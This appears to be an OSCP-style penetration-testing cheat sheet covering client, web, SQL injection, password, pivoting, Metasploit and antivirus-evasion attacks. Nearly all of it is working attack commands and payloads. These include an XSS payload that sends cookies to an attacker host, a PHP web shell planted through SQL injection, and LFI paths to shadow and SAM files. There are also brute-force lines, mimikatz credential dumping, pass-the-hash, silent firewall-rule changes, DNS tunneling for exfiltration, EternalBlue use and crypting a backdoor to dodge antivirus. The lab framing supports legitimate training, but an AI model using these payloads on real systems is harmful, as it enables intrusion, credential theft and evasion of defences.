Client, Web and Password Attacks
==============================================================================================================================

-   <span id="_pcjm0n4oppqx" class="anchor"><span id="_Toc480741817" class="anchor"></span></span>Client Attacks
    ------------------------------------------------------------------------------------------------------------

    -   MS12-037- Internet Explorer 8 Fixed Col Span ID  
        `wget -O exploit.html
        <http://www.exploit-db.com/download/24017>  
        service apache2 start`

    -   JAVA Signed Jar client side attack  
        `echo '<applet width="1" height="1" id="Java Secure"
        code="Java.class" archive="SignedJava.jar"><param name="1"
        value="http://$ip:80/evil.exe"></applet>' >
        /var/www/html/java.html`
        User must hit run on the popup that occurs.

    -   Linux Client Shells  
        [*http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/*](http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)

    -   Setting up the Client Side Exploit

    -   Swapping Out the Shellcode

    -   Injecting a Backdoor Shell into Plink.exe  
        `backdoor-factory -f /usr/share/windows-binaries/plink.exe -H $ip 
        -P 4444 -s reverse\_shell\_tcp`

-   <span id="_n6fr3j21cp1m" class="anchor"><span id="_Toc480741818" class="anchor"></span></span>Web Attacks
    ---------------------------------------------------------------------------------------------------------

    -   Web Shag Web Application Vulnerability Assessment Platform  
        `webshag-gui`

    -   Web Shells  
        [*http://tools.kali.org/maintaining-access/webshells*](http://tools.kali.org/maintaining-access/webshells)  
        `ls -l /usr/share/webshells/`

    -   Generate a PHP backdoor (generate) protected with the given
        ````
        password (s3cr3t)  
        weevely generate s3cr3t  
        weevely http://$ip/weevely.php s3cr3t
        ````
        
    -   Java Signed Applet Attack

    -   HTTP / HTTPS Webserver Enumeration

        -   OWASP Dirbuster

        -   `nikto -h $ip`

    -   Essential Iceweasel Add-ons  
        Cookies Manager
        https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/  
        Tamper Data  
        https://addons.mozilla.org/en-US/firefox/addon/tamper-data/

    -   Cross Site Scripting (XSS)  
        significant impacts, such as cookie stealing and authentication
        bypass, redirecting the victim’s browser to a malicious HTML
        page, and more

    -   Browser Redirection and IFRAME Injection
        ```html
        <iframe SRC="http://$ip/report" height = "0" width="0"></iframe>
        ```

    -   Stealing Cookies and Session Information
        ```javascript
        <javascript>  
        new image().src="http://$ip/bogus.php?output="+document.cookie;  
        </script>
        ```
        `nc -nlvp 80`

-   File Inclusion Vulnerabilities 
    -----------------------------------------------------------------------------------------------------------------------------

    -   Local (LFI) and remote (RFI) file inclusion vulnerabilities are
        commonly found in poorly written PHP code.

    -   fimap - There is a Python tool called fimap which can be
        leveraged to automate the exploitation of LFI/RFI
        vulnerabilities that are found in PHP (sqlmap for LFI):  
        [*https://github.com/kurobeats/fimap*](https://github.com/kurobeats/fimap)

        -   Gaining a shell from phpinfo()  
            fimap + phpinfo() Exploit - If a phpinfo() file is present,
            it’s usually possible to get a shell, if you don’t know the
            location of the phpinfo file fimap can probe for it, or you
            could use a tool like OWASP DirBuster.

    -   For Local File Inclusions look for the include() function in PHP
        code.
        ```php  
        include("lang/".$_COOKIE['lang']);  
        include($_GET['page'].".php");
        ```

    -   LFI - Encode and Decode a file using base64  
        ```bash
        curl -s \
        "http://$ip/?page=php://filter/convert.base64-encode/resource=index" \
        | grep -e '\[^\\ \]\\{40,\\}' | base64 -d
        ```

    -   LFI - Download file with base 64 encoding  
        [*http://$ip/index.php?page=php://filter/convert.base64-encode/resource=admin.php*](about:blank)

    -   LFI Linux Files:
        ````
        /etc/issue  
        /proc/version  
        /etc/profile  
        /etc/passwd  
        /etc/passwd  
        /etc/shadow  
        /root/.bash\_history  
        /var/log/dmessage  
        /var/mail/root  
        /var/spool/cron/crontabs/root
        ````

    -   LFI Windows Files:
        ````
        %SYSTEMROOT%\\repair\\system  
        %SYSTEMROOT%\\repair\\SAM  
        %SYSTEMROOT%\\repair\\SAM  
        %WINDIR%\\win.ini  
        %SYSTEMDRIVE%\\boot.ini  
        %WINDIR%\\Panther\\sysprep.inf  
        %WINDIR%\\system32\\config\\AppEvent.Evt
        ````

    -   LFI OSX Files:
        ````
        /etc/fstab
        /etc/master.passwd
        /etc/resolv.conf
        /etc/sudoers
        /etc/sysctl.conf
        ````

    -   LFI - Download passwords file  
        [*http://$ip/index.php?page=/etc/passwd*](about:blank)  
        [*http://$ip/index.php?file=../../../../etc/passwd*](about:blank)

    -   LFI - Download passwords file with filter evasion  
        [*http://$ip/index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd*](about:blank)

    -   Local File Inclusion - In versions of PHP below 5.3 we can
        terminate with null byte  
        GET
        /addguestbook.php?name=Haxor&comment=Merci!&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00

    -   Contaminating Log Files `<?php echo shell_exec($_GET['cmd']);?>`

    -   For a Remote File Inclusion look for php code that is not  sanitized and passed to the PHP include function and the php.ini
        file must be configured to allow remote files

        */etc/php5/cgi/php.ini* - "allow_url_fopen" and "allow_url_include" both set to "on"  

        `include($_REQUEST["file"].".php");`

    -   Remote File Inclusion  

         `http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt `

         `<?php echo shell\_exec("ipconfig");?>`

-   <span id="_mgu7e3u7svak" class="anchor"><span id="_Toc480741820" class="anchor"></span></span>Database Vulnerabilities
    ----------------------------------------------------------------------------------------------------------------------

    -   Playing with SQL Syntax
    A great tool I have found for playing with SQL Syntax for a variety of database types (MSSQL Server, MySql, PostGreSql, Oracle) is SQL Fiddle:

    http://sqlfiddle.com

    Another site is rextester.com:

    http://rextester.com/l/mysql_online_compiler

    -   Detecting SQL Injection Vulnerabilities. 

         Most modern automated scanner tools use time delay techniques to detect SQL injection vulnerabilities.  This method can tell you if a SQL injection vulnerability is present even if it is a "blind" sql injection vulnerabilit that does not provide any data back.  You know your SQL injection is working when the server takes a LOooooong time to respond.  I have added a line comment at the end of each injection statement just in case there is additional SQL code after the injection point.


        - **MSSQL Server SQL Injection Time Delay Detection:**
        Add a 30 second delay to a MSSQL Server Query

          - *Original Query*

            `SELECT * FROM products WHERE name='Test';`

          - *Injection Value*

            `'; WAITFOR DELAY '00:00:30'; --`

          - *Resulting Query*

            `SELECT * FROM products WHERE name='Test'; WAITFOR DELAY '00:00:30'; --`

        - **MySQL Injection Time Delay Detection:**
        Add a 30 second delay to a MySQL Query

          - *Original Query*

            `SELECT * FROM products WHERE name='Test';`

          - *Injection Value*

            `'-SLEEP(30); #`

          - *Resulting Query*

            `SELECT * FROM products WHERE name='Test'-SLEEP(30); #`


        - **PostGreSQL Injection Time Delay Detection:**
        Add a 30 second delay to an PostGreSQL Query

          - *Original Query*

            `SELECT * FROM products WHERE name='Test';`

          - *Injection Value*

            `'; SELECT pg_sleep(30); --`

          - *Resulting Query*

            `SELECT * FROM products WHERE name='Test'; SELECT pg_sleep(30); --`

    -   Grab password hashes from a web application mysql database called “Users” - once you have the MySQL root username and        password  

              mysql -u root -p -h $ip
              use "Users"  
              show tables;  
              select \* from users;

    -   Authentication Bypass  

              name='wronguser' or 1=1;  
              name='wronguser' or 1=1 LIMIT 1;

    -   Enumerating the Database  

        `http://192.168.11.35/comment.php?id=738)'`  

        Verbose error message?  

        `http://$ip/comment.php?id=738 order by 1`

        `http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6  `

        Determine MySQL Version:  

        `http://$ip/comment.php?id=738 union all select 1,2,3,4,@@version,6  `

        Current user being used for the database connection:

        `http://$ip/comment.php?id=738 union all select 1,2,3,4,user(),6  `

        Enumerate database tables and column structures  

        `http://$ip/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables  `

        Target the users table in the database  

        `http://$ip/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where        table_name='users'  `

        Extract the name and password  

        `http://$ip/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users ` 

        Create a backdoor

        `http://$ip/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE        'c:/xampp/htdocs/backdoor.php'`


    -   **SQLMap Examples**

      - Crawl the links

         `sqlmap -u http://$ip --crawl=1`

         `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3`


      - SQLMap Search for databases against a suspected GET SQL Injection 

        `sqlmap –u http://$ip/blog/index.php?search –dbs`

      - SQLMap dump tables from database oscommerce at GET SQL injection

        `sqlmap –u http://$ip/blog/index.php?search= –dbs –D oscommerce –tables –dumps `

      - SQLMap GET Parameter command  

         `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump -threads=5  `

      - SQLMap Post Username parameter

          `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --dump-all`

      - SQL Map OS Shell

          `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell  `

          `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --os-shell`

       - Automated sqlmap scan

          `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php"`

        - Targeted sqlmap scan

           `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump`

         - Scan url for union + error based injection with mysql backend and use a random user agent + database dump  

            `sqlmap -o -u http://$ip/index.php --forms --dbs  `

            `sqlmap -o -u "http://$ip/form/" --forms`

          - Sqlmap check form for injection  

             `sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump`

           - Enumerate databases  

              `sqlmap --dbms=mysql -u "$URL" --dbs`

            - Enumerate tables from a specific database  

              `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables  `

            - Dump table data from a specific database and table  

               `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump `

            - Specify parameter to exploit  

               `sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2 `

            - Specify parameter to exploit in 'nice' URIs (exploits param1)

                `sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs `

            - Get OS shell  

                 `sqlmap --dbms=mysql -u "$URL" --os-shell`

            - Get SQL shell  

                 `sqlmap --dbms=mysql -u "$URL" --sql-shell`

             - SQL query  

                `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"` 

             - Use Tor Socks5 proxy  

                `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`


-   **NoSQLMap Examples**
       You may encounter NoSQL instances like MongoDB in your OSCP journies (`/cgi-bin/mongo/2.2.3/dbparse.py`).  NoSQLMap can help you to automate NoSQLDatabase enumeration. 

  -   NoSQLMap Installation 

        ```bash
        git clone https://github.com/codingo/NoSQLMap.git
        cd NoSQLMap/
        ls
        pip install couchdb
        pip install pbkdf2
        pip install ipcalc
        python nosqlmap.py
        ```


   -   Often you can create an exception dump message with MongoDB using a malformed NoSQLQuery such as:

      `a'; return this.a != 'BadData’'; var dummy='!`



-   Password Attacks
    --------------------------------------------------------------------------------------------------------------

    -   AES Decryption  
        http://aesencryption.net/

    -   Convert multiple webpages into a word list
        ```bash
        for x in 'index' 'about' 'post' 'contact' ; do \
          curl http://$ip/$x.html | html2markdown | tr -s ' ' '\\n' >> webapp.txt ; \
        done
        ```

    -   Or convert html to word list dict  
        `html2dic index.html.out | sort -u > index-html.dict`

    -   Default Usernames and Passwords

        -   CIRT  
            [*http://www.cirt.net/passwords*](http://www.cirt.net/passwords)

        -   Government Security - Default Logins and Passwords for
            Networked Devices

        -   [*http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php*](http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php)

        -   Virus.org  
            [*http://www.virus.org/default-password/*](http://www.virus.org/default-password/)

        -   Default Password  
            [*http://www.defaultpassword.com/*](http://www.defaultpassword.com/)

    -   Brute Force

        -   Nmap Brute forcing Scripts  
            [*https://nmap.org/nsedoc/categories/brute.html*](https://nmap.org/nsedoc/categories/brute.html)

        -   Nmap Generic auto detect brute force attack:
            `nmap --script brute -Pn <target.com or ip>`

        -   MySQL nmap brute force attack:
            `nmap --script=mysql-brute $ip`

    -   Dictionary Files

        -   Word lists on Kali  
            `cd /usr/share/wordlists`

    -   Key-space Brute Force

        -   `crunch 6 6 0123456789ABCDEF -o crunch1.txt`

        -   `crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha`

        -   `crunch 8 8 -t ,@@^^%%%`

    -   Pwdump and Fgdump - Security Accounts Manager (SAM)

        -   `pwdump.exe` - attempts to extract password hashes

        -   `fgdump.exe` - attempts to kill local antiviruses before
            attempting to dump the password hashes and
            cached credentials.

    -   Windows Credential Editor (WCE)

        -   allows one to perform several attacks to obtain clear text
            passwords and hashes. Usage: `wce -w`

    -   Mimikatz

        -   extract plaintexts passwords, hash, PIN code and kerberos
            tickets from memory. mimikatz can also perform
            pass-the-hash, pass-the-ticket or build Golden tickets  
            [*https://github.com/gentilkiwi/mimikatz*](https://github.com/gentilkiwi/mimikatz)
            From metasploit meterpreter (must have System level access):
            ```
            meterpreter> load mimikatz
            meterpreter> help mimikatz
            meterpreter> msv
            meterpreter> kerberos
            meterpreter> mimikatz_command -f samdump::hashes
            meterpreter> mimikatz_command -f sekurlsa::searchPasswords
            ```

    -   Password Profiling

        -   cewl can generate a password list from a web page  
            `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`

    -   Password Mutating

        -   John the ripper can mutate password lists  
            nano /etc/john/john.conf  
            `john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt`

    -   Medusa

        -   Medusa, initiated against an htaccess protected web
            directory  
            `medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10`

    -   Ncrack

        -   ncrack (from the makers of nmap) can brute force RDP  
            `ncrack -vv --user offsec -P password-file.txt rdp://$ip`

    -   Hydra

        -   Hydra brute force against SNMP  

            `hydra -P password-file.txt -v $ip snmp`

        -   Hydra FTP known user and rockyou password list  

            `hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp`

        -   Hydra SSH using list of users and passwords  

            `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`

        -   Hydra SSH using a known password and a username list  

            `hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh`

        -   Hydra SSH Against Known username on port 22

            `hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt`

        -   Hydra POP3 Brute Force  

            `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`

        -   Hydra SMTP Brute Force  

            `hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V`

        -   Hydra attack http get 401 login with a dictionary  

            `hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin`

        -   Hydra attack Windows Remote Desktop with rockyou

            `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`

        -   Hydra brute force SMB user with rockyou:

            `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`

        -   Hydra brute force a Wordpress admin login

            `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`



-   <span id="_bnmnt83v58wk" class="anchor"><span id="_Toc480741822" class="anchor"></span></span>Password Hash Attacks
    -------------------------------------------------------------------------------------------------------------------

    -   Online Password Cracking  
        [*https://crackstation.net/*](https://crackstation.net/)
        [*http://finder.insidepro.com/*](http://finder.insidepro.com/)

    -   Hashcat
    Needed to install new drivers to get my GPU Cracking to work on the Kali linux VM and I also had to use the --force parameter.

      `apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev`

      and

      `apt-get install pocl-opencl-icd`


    Cracking Linux Hashes - /etc/shadow file
    ```
     500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
    3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
    7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
    1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
    ```
    Cracking Windows Hashes
    ```
    3000 | LM                                               | Operating-Systems
    1000 | NTLM                                             | Operating-Systems
    ```
    Cracking Common Application Hashes
    ```
      900 | MD4                                              | Raw Hash
        0 | MD5                                              | Raw Hash
     5100 | Half MD5                                         | Raw Hash
      100 | SHA1                                             | Raw Hash
    10800 | SHA-384                                          | Raw Hash
     1400 | SHA-256                                          | Raw Hash
     1700 | SHA-512                                          | Raw Hash
    ```

    Create a .hash file with all the hashes you want to crack
    puthasheshere.hash:
    `$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/`

    Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:

    `hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt`

    Wordpress sample hash: `$P$B55D6LjfHDkINU5wF.v2BuuzO0/XPk/`

    Wordpress clear text: `test`

    Hashcat example cracking Wordpress passwords using rockyou:

      `hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt`

    -   Sample Hashes  
        [*http://openwall.info/wiki/john/sample-hashes*](http://openwall.info/wiki/john/sample-hashes)

    -   Identify Hashes  

        `hash-identifier`

    -   To crack linux hashes you must first unshadow them:  

        `unshadow passwd-file.txt shadow-file.txt`

        `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`

-   John the Ripper - Password Hash Cracking

    -   `john $ip.pwdump`

    -   `john --wordlist=/usr/share/wordlists/rockyou.txt hashes`

    -   `john --rules --wordlist=/usr/share/wordlists/rockyou.txt`

    -   `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`

    -   JTR forced descrypt cracking with wordlist  

        `john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt`

    -   JTR forced descrypt brute force cracking  

        `john --format=descrypt hash --show`

-   Passing the Hash in Windows

    -   Use Metasploit to exploit one of the SMB servers in the labs.
        Dump the password hashes and attempt a pass-the-hash attack
        against another system:  

        `export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 `

        `pth-winexe -U administrator //$ip cmd`

<span id="_6nmbgmpltwon" class="anchor"><span id="_Toc480741823" class="anchor"></span></span>Networking, Pivoting and Tunneling
================================================================================================================================

-   Port Forwarding - accept traffic on a given IP address and port and
    redirect it to a different IP address and port

    -   `apt-get install rinetd`

    -   `cat /etc/rinetd.conf`

        ```
        # bindadress bindport connectaddress connectport
        w.x.y.z 53 a.b.c.d 80
        ```

-   SSH Local Port Forwarding: supports bi-directional communication
    channels

    -   `ssh <gateway> -L <local port to listen>:<remote host>:<remote port>`

-   SSH Remote Port Forwarding: Suitable for popping a remote shell on
    an internal non routable network

    -   `ssh <gateway> -R <remote port to bind>:<local host>:<local port>` 

-   SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local
    attacking box to tunnel ALL incoming traffic to ANY host in the DMZ
    network on ANY PORT

    -   `ssh -D <local proxy port> -p <remote port> <target>`

-   Proxychains - Perform nmap scan within a DMZ from an external
    computer

    -   Create reverse SSH tunnel from Popped machine on :2222  

        `ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com`
        `ssh -f -N -R 2222:<local host>:22 root@<remote host>`

    -   Create a Dynamic application-level port forward on 8080 thru
        2222  

        `ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host>`

    -   Leverage the SSH SOCKS server to perform Nmap scan on network
        using proxy chains  

        `proxychains nmap --top-ports=20 -sT -Pn $ip/24`

-   HTTP Tunneling  

      `nc -vvn $ip 8888`

-   Traffic Encapsulation - Bypassing deep packet inspection

    -   http tunnel  
        On server side:  
        `sudo hts -F <server ip addr>:<port of your app> 80  `
        On client side:  
        `sudo htc -P <my proxy.com:proxy port> -F <port of your app> <server ip addr>:80 stunnel`

-   Tunnel Remote Desktop (RDP) from a Popped Windows machine to your
    network

    -   Tunnel on port 22  

        `plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>`

    -   Port 22 blocked? Try port 80? or 443?  

        `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P80`

-   Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel
    (bypass deep packet inspection)

    -   Windows machine add required firewall rules without prompting the user

    -   `netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes`

    -   `netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000`

    -   `netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080`

    -   `netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079`

    -   Start the http tunnel client  

         `httptunnel_client.exe`

    -   Create HTTP reverse shell by connecting to localhost port 3000  

        `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P 3000`

-   VLAN Hopping

    -   ```bash
        git clone https://github.com/nccgroup/vlan-hopping.git  
        chmod 700 frogger.sh  
        ./frogger.sh
        ```


-   VPN Hacking

    -   Identify VPN servers:  
        `./udp-protocol-scanner.pl -p ike $ip`

    -   Scan a range for VPN servers:  
        `./udp-protocol-scanner.pl -p ike -f ip.txt`

    -   Use IKEForce to enumerate or dictionary attack VPN servers:  

        `pip install pyip`  

        `git clone https://github.com/SpiderLabs/ikeforce.git  `

        Perform IKE VPN enumeration with IKEForce:  

        `./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic  `

        Bruteforce IKE VPN using IKEForce:  

        `./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1  `
        Use ike-scan to capture the PSK hash:  

        ```bash
        ike-scan  
        ike-scan TARGET-IP  
        ike-scan -A TARGET-IP  
        ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key  
        ike-scan –M –A –n example\_group -P hash-file.txt TARGET-IP
        ```
        Use psk-crack to crack the PSK hash  

        ```bash
        psk-crack hash-file.txt  
        pskcrack  
        psk-crack -b 5 TARGET-IPkey  
        psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key  
        psk-crack -d /path/to/dictionary-file TARGET-IP-key
        ```

-   PPTP Hacking

    -   Identifying PPTP, it listens on TCP: 1723  
        NMAP PPTP Fingerprint:  

        `nmap –Pn -sV -p 1723 TARGET(S)  `
        PPTP Dictionary Attack  

        `thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst`

-   Port Forwarding/Redirection

-   PuTTY Link tunnel - SSH Tunneling

    -   Forward remote port to local address:  

         `plink.exe -P 22 -l root -pw "1337" -R 445:<local host>:445 <remote host>`

-   SSH Pivoting

    -   SSH pivoting from one network to another:  

        `ssh -D <local host>:1010 -p 22 user@<remote host>`

-   DNS Tunneling

    -   dnscat2 supports “download” and “upload” commands for getting iles (data and programs) to and from the target machine.

    -   Attacking Machine Installation:  

        ```bash
        apt-get update  
        apt-get -y install ruby-dev git make g++  
        gem install bundler  
        git clone https://github.com/iagox86/dnscat2.git  
        cd dnscat2/server  
        bundle install
        ```

    -   Run dnscat2:  

        ```
        ruby ./dnscat2.rb  
        dnscat2> New session established: 1422  
        dnscat2> session -i 1422
        ```

    -   Target Machine:  
        [*https://downloads.skullsecurity.org/dnscat2/*](https://downloads.skullsecurity.org/dnscat2/)

        [*https://github.com/lukebaggett/dnscat2-powershell/*](https://github.com/lukebaggett/dnscat2-powershell/)

        `dnscat --host <dnscat server ip>`

<span id="_ujpvtdpc9i67" class="anchor"><span id="_Toc480741824" class="anchor"></span></span>The Metasploit Framework
======================================================================================================================

-   See [*Metasploit Unleashed
    Course*](https://www.offensive-security.com/metasploit-unleashed/)
    in the Essentials

-   Search for exploits using Metasploit GitHub framework source code:  
    [*https://github.com/rapid7/metasploit-framework*](https://github.com/rapid7/metasploit-framework)  
    Translate them for use on OSCP LAB or EXAM.

-   Metasploit

    -   MetaSploit requires Postfresql  

        `systemctl start postgresql`

    -   To enable Postgresql on startup  

        `systemctl enable postgresql`

-   MSF Syntax

    -   Start metasploit  

        `msfconsole  `

        `msfconsole -q`

    -   Show help for command  

        `show -h`

    -   Show Auxiliary modules  

        `show auxiliary`

    -   Use a module  

        ```
        use auxiliary/scanner/snmp/snmp_enum  
        use auxiliary/scanner/http/webdav_scanner  
        use auxiliary/scanner/smb/smb_version  
        use auxiliary/scanner/ftp/ftp_login  
        use exploit/windows/pop3/seattlelab_pass
        ```

    -   Show the basic information for a module  

        `info`

    -   Show the configuration parameters for a module  

        `show options`

    -   Set options for a module  

        ```
        set RHOSTS 192.168.1.1-254  
        set THREADS 10
        ```

    -   Run the module  

        `run`

    -   Execute an Exploit 

        `exploit`

    -   Search for a module  

        `search type:auxiliary login`

-   Metasploit Database Access

    -   Show all hosts discovered in the MSF database  

        `hosts`

    -   Scan for hosts and store them in the MSF database  

        `db_nmap`

    -   Search machines for specific ports in MSF database 

        `services -p 443`

    -   Leverage MSF database to scan SMB ports (auto-completed rhosts)  

        `services -p 443 --rhosts`

-   Staged and Non-staged

    -   Non-staged payload - is a payload that is sent in its entirety in one go

    -   Staged - sent in two parts  Not have enough buffer space  Or need to bypass antivirus

-   MS 17-010 - EternalBlue

    -   You may find some boxes that are vulnerable to MS17-010 (AKA. EternalBlue).  Although, not offically part of the indended course, this exploit can be leveraged to gain SYSTEM level access to a Windows box.  I have never had much luck using the built in Metasploit EternalBlue module.  I found that the elevenpaths version works much more relabily. Here are the instructions to install it taken from the following YouTube video: [*https://www.youtube.com/watch?v=4OHLor9VaRI*](https://www.youtube.com/watch?v=4OHLor9VaRI)


    1. First step is to configure the Kali to work with wine 32bit
        ````
        dpkg --add-architecture i386 && apt-get update && apt-get install wine32
        rm -r ~/.wine
        wine cmd.exe
        exit
        ````
        
    2. Download the exploit repostory `https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit`

    3. Move the exploit to `/usr/share/metasploit-framework/modules/exploits/windows/smb` or `~/.msf4/modules/exploits/windows/smb`

    4. Start metasploit console


     -   I found that using spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxes.

      ```
      use exploit/windows/smb/eternalblue_doublepulsar
      msf exploit(eternalblue_doublepulsar) > set RHOST 10.10.10.10
      RHOST => 10.10.10.10
      msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT spoolsv.exe
      PROCESSINJECT => spoolsv.exe
      msf exploit(eternalblue_doublepulsar) > run
      ```


-   Experimenting with Meterpreter

    -   Get system information from Meterpreter Shell  

        `sysinfo`

    -   Get user id from Meterpreter Shell  

        `getuid`

    -   Search for a file  

        `search -f *pass*.txt`

    -   Upload a file  

        `upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec`

    -   Download a file  

        `download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`

    -   Invoke a command shell from Meterpreter Shell  

        `shell`

    -   Exit the meterpreter shell  

        `exit`

-   Metasploit Exploit Multi Handler

    -   multi/handler to accept an incoming reverse\_https\_meterpreter

        ```
        payload  
        use exploit/multi/handler  
        set PAYLOAD windows/meterpreter/reverse_https  
        set LHOST $ip  
        set LPORT 443  
        exploit  
        [*] Started HTTPS reverse handler on https://$ip:443/
        ```

-   Building Your Own MSF Module

    -   
        ```bash
        mkdir -p ~/.msf4/modules/exploits/linux/misc  
        cd ~/.msf4/modules/exploits/linux/misc  
        cp /usr/share/metasploitframework/modules/exploits/linux/misc/gld\_postfix.rb ./crossfire.rb  
        nano crossfire.rb
        ```


-   Post Exploitation with Metasploit - (available options depend on OS and Meterpreter Cababilities)

    -   `download` Download a file or directory  
        `upload` Upload a file or directory  
        `portfwd` Forward a local port to a remote service  
        `route` View and modify the routing table  
        `keyscan_start` Start capturing keystrokes  
        `keyscan_stop` Stop capturing keystrokes  
        `screenshot` Grab a screenshot of the interactive desktop  
        `record_mic` Record audio from the default microphone for X seconds  
        `webcam_snap` Take a snapshot from the specified webcam  
        `getsystem` Attempt to elevate your privilege to that of local system.  
        `hashdump` Dumps the contents of the SAM database

-   Meterpreter Post Exploitation Features

    -   Create a Meterpreter background session  

        `background`

<span id="_51btodqc88s2" class="anchor"><span id="_Toc480741825" class="anchor"></span></span>Bypassing Antivirus Software 
===========================================================================================================================

-   Crypting Known Malware with Software Protectors

    -   One such open source crypter, called Hyperion  

        ```bash
        cp /usr/share/windows-binaries/Hyperion-1.0.zip  
        unzip Hyperion-1.0.zip  
        cd Hyperion-1.0/  
        i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe  
        cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll .  
        cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll .  
        wine hyperion.exe ../backdoor.exe ../crypted.exe
        ```
